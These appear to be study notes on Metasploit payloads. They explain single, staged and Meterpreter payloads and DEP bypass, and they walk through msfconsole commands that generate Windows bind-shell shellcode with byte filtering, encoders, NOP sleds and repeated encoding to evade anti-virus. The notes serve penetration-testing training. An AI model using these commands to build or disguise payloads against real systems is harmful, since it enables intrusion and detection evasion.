# Payloads

## Types by Usage

* There are three main types of payload modules in Metasploit: **Singles**, **Stagers**, and **Stages**.
* Whether or not a payload is staged, is represented by ‘**/**’ in the payload name.
  * **windows/shell\_bind\_tcp** is a **single** payload with no stage.
  * **windows/shell/bind\_tcp** consists of a **stager** \(bind\_tcp\) and a **stage** \(shell\).

### Singles

* Singles are payloads that are **self-contained** and completely **standalone**.
* **Inline**, **Non Staged**, and more **Stable**.

### Stagers

* Stagers setup a network **connection** between the **attacker** and **victim** and are designed to be **small** and **reliable**.
* It is **difficult** to always do **both** \(small/reliable\) of these well so the result is **multiple similar stagers**.
* Metasploit will use the best one when it can and fall back to a less-preferred one when necessary.
* Windows **NX vs. NO-NX** Stagers
  * Reliability issue for NX CPUs and DEP
  * NX stagers are bigger \(VirtualAlloc\)
  * Default is now NX + Win7 compatible

### Stages

* Stages are payload components that are **downloaded by Stagers** modules.
* The various payload stages provide advanced features with **no size limits**.

## Types by Function

### Meterpreter

* Short form of **Meta-Interpreter**.
* The Meterpreter resides completely **in the memory of the remote host** and leaves no traces on the hard drive.
* Scripts and plugins can be **loaded and unloaded dynamically** as required.

### PassiveX

* PassiveX help in **circumventing restrictive outbound firewall**s by using an **ActiveX control** to create a hidden instance of Internet Explorer.
* Using the new ActiveX control, it communicates with the attacker via **HTTP** requests and responses.

### NoNX

* The NX \(**No eXecute**\) bit is a feature built into some CPUs to prevent code from executing in certain areas of memory. In Windows, NX is implemented as Data Execution Prevention \(**DEP**\).
* The Metasploit NoNX payloads are designed to **circumvent DEP**.

### Ord

* **Ordinal** payloads are Windows stager based payloads.
* Advantages
  * It works on **every** flavour and language of Windows **without** the explicit definition of a return address.
  * They are also **extremely tiny**.
* Disadvantages
  * It relies on the fact that **ws2\_32.dll** is loaded in the process being exploited before exploitation.
  * It’s a bit **less stable** than the other stagers.

### IPv6

* The Metasploit IPv6 payloads, as the name indicates, are built to function over **IPv6 networks**.

### Reflective DLL Injection

* Reflective DLL Injection is a technique whereby a **stage payload** is **injected** into a compromised host process running in memory, **never touching the host hard drive**.
* The **VNC** and **Meterpreter** payloads both make use of reflective DLL injection.

## Generating Payloads

*  When you **use** a certain payload, Metasploit adds the **generate**, **pry**, and **reload** commands.

```bash
msf > use payload/windows/shell_bind_tcp
msf payload(shell_bind_tcp) > generate
# windows/shell_bind_tcp - 341 bytes
# http://www.metasploit.com
# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process, 
# InitialAutoRunScript=, AutoRunScript=
buf = 
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" +
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" +
"\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" +
...snip...
```

### Unwanted Bytes \(-b\)

* To remove **unwanted bytes** or **bad characters**, e.g., the **null** byte \(\x00\), we issue the generate command followed by the **-b** switch with accompanying bytes we wish to be disallowed during the generation process.

```bash
msf  payload(shell_bind_tcp) > generate -b '\x00'
# windows/shell_bind_tcp - 368 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process, 
# InitialAutoRunScript=, AutoRunScript=
buf = 
"\xdb\xde\xba\x99\x7c\x1b\x5f\xd9\x74\x24\xf4\x5e\x2b\xc9" +
"\xb1\x56\x83\xee\xfc\x31\x56\x14\x03\x56\x8d\x9e\xee\xa3" +
"\x45\xd7\x11\x5c\x95\x88\x98\xb9\xa4\x9a\xff\xca\x94\x2a" +
...snip...
```

* Note that the shellcode’s **total byte size** and the **encoder** changed.
* By default Metasploit will **select the best encoder** to accomplish the generation when using the -b switch to remove **restricted byte list**. 
* If **too many** restricted bytes are given no encoder may be up for the task.

```bash
msf  payload(shell_bind_tcp) > generate -b '\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b\xFF\x0a\x0b\x01\xcc\6e\x1e\x2e\x26'
[-] Payload generation failed: No encoders encoded the buffer successfully.
```

### Encoders \(-e\)

* To choose a **specific encoder**, use the **-e** switch followed by the encoder’s name.
* Be **careful** when using a different encoder other than the default, as it tends to give us a **larger** payload.

```bash
msf  payload(shell_bind_tcp) > show encoders
...snip...
msf  payload(shell_bind_tcp) > generate -e x86/nonalpha
# windows/shell_bind_tcp - 489 bytes
# http://www.metasploit.com
# Encoder: x86/nonalpha
# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process, 
# InitialAutoRunScript=, AutoRunScript=
buf = 
"\x66\xb9\xff\xff\xeb\x19\x5e\x8b\xfe\x83\xc7\x70\x8b\xd7" +
"\x3b\xf2\x7d\x0b\xb0\x7b\xf2\xae\xff\xcf\xac\x28\x07\xeb" +
"\xf1\xeb\x75\xe8\xe2\xff\xff\xff\x17\x29\x29\x29\x09\x31" +
...snip...
```

### Saving to a File \(-f\)

* To **save** our generated payload to a **file** instead of displaying it on the screen, use the **-f** switch.

```bash
msf  payload(shell_bind_tcp) > generate -b '\x00' -e x86/shikata_ga_nai -f /root/msfu/filename.txt
[*] Writing 1803 bytes to /root/msfu/filename.txt...
msf  payload(shell_bind_tcp) > cat ~/msfu/filename.txt
[*] exec: cat ~/msfu/filename.txt

# windows/shell_bind_tcp - 368 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process, 
# InitialAutoRunScript=, AutoRunScript=
buf = 
"\xdb\xcb\xb8\x4f\xd9\x99\x0f\xd9\x74\x24\xf4\x5a\x2b\xc9" +
"\xb1\x56\x31\x42\x18\x83\xc2\x04\x03\x42\x5b\x3b\x6c\xf3" +
"\x8b\x32\x8f\x0c\x4b\x25\x19\xe9\x7a\x77\x7d\x79\x2e\x47" +
...snip...
```

### Iterations \(-i\)

* To **evade anti-virus** and make payloads **less prone to detection**, use the **iteration** switch **-i** to specify how many encoding passes must be done before producing the final payload.
* The more iterations one does the **larger** our payload will be.

```bash
msf  payload(shell_bind_tcp) > generate -b '\x00' -i 2
# windows/shell_bind_tcp - 395 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process, 
# InitialAutoRunScript=, AutoRunScript=
buf = 
"\xbd\xea\x95\xc9\x5b\xda\xcd\xd9\x74\x24\xf4\x5f\x31\xc9" +
"\xb1\x5d\x31\x6f\x12\x83\xc7\x04\x03\x85\x9b\x2b\xae\x80" +
"\x52\x72\x25\x16\x6f\x3d\x73\x9c\x0b\x38\x26\x11\xdd\xf4" +
...snip...
```

### Options \(-o\)

* Issue the **show options** command to see which options we can change for this payload.
* To change the default values, use the **-o** switch followed by the value we wish to change. The syntax is **VARIABLE=VALUE** separated by a **comma** between each option.

```bash
msf  payload(shell_bind_tcp) > show options

Module options (payload/windows/shell_bind_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique: seh, thread, process, none
   LPORT     4444             yes       The listen port
   RHOST                      no        The target address

msf  payload(shell_bind_tcp) > generate -o LPORT=1234,EXITFUNC=seh -b '\x00' -e x86/shikata_ga_nai
# windows/shell_bind_tcp - 368 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, LPORT=1234, RHOST=, EXITFUNC=seh, 
# InitialAutoRunScript=, AutoRunScript=
buf = 
"\xdb\xd1\xd9\x74\x24\xf4\xbb\x93\x49\x9d\x3b\x5a\x29\xc9" +
"\xb1\x56\x83\xc2\x04\x31\x5a\x14\x03\x5a\x87\xab\x68\xc7" +
"\x4f\xa2\x93\x38\x8f\xd5\x1a\xdd\xbe\xc7\x79\x95\x92\xd7" +
...snip...
```

### Output Formats \(-t\)

* When generating payloads, the **default output format** given is ‘**ruby**’.
* To specify a different output format, use the **-t** switch followed by the format name.

```bash
msf  payload(shell_bind_tcp) > generate -t c
/*
 * windows/shell_bind_tcp - 341 bytes
 * http://www.metasploit.com
 * VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process, 
 * InitialAutoRunScript=, AutoRunScript=
 */
unsigned char buf[] = 
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
...snip...
```

```bash
msf  payload(shell_bind_tcp) > generate -t java
/*
 * windows/shell_bind_tcp - 341 bytes
 * http://www.metasploit.com
 * VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process, 
 * InitialAutoRunScript=, AutoRunScript=
 */
byte shell[] = new byte[]
{
	(byte) 0xfc, (byte) 0xe8, (byte) 0x89, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x60, (byte) 0x89,
	(byte) 0xe5, (byte) 0x31, (byte) 0xd2, (byte) 0x64, (byte) 0x8b, (byte) 0x52, (byte) 0x30, (byte) 0x8b,
	(byte) 0x52, (byte) 0x0c, (byte) 0x8b, (byte) 0x52, (byte) 0x14, (byte) 0x8b, (byte) 0x72, (byte) 0x28,
...snip...
```

### NOP Sled \(-s\)

* Adding a NOP \(**No Operation** or **Next Operation**\) sled is accomplished with the **-s** switch followed by the **number** of NOPs. This will add the sled at the **beginning** of our payload.
* The **larger** the sled the **larger** the shellcode will be. So adding a 10 NOPs will add 10 bytes to the total size.

```bash
msf  payload(shell_bind_tcp) > generate -s 14
# windows/shell_bind_tcp - 355 bytes
# http://www.metasploit.com
# NOP gen: x86/opty2
# VERBOSE=false, LPORT=4444, RHOST=, EXITFUNC=process, 
# InitialAutoRunScript=, AutoRunScript=
buf = 
"\xb9\xd5\x15\x9f\x90\x04\xf8\x96\x24\x34\x1c\x98\x14\x4a" +
"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52" +
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26" +
"\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d" +
...snip...
```

## References

{% embed url="https://www.offensive-security.com/metasploit-unleashed/payloads/" %}

{% embed url="https://www.offensive-security.com/metasploit-unleashed/payload-types/" %}

{% embed url="https://www.offensive-security.com/metasploit-unleashed/generating-payloads/" %}

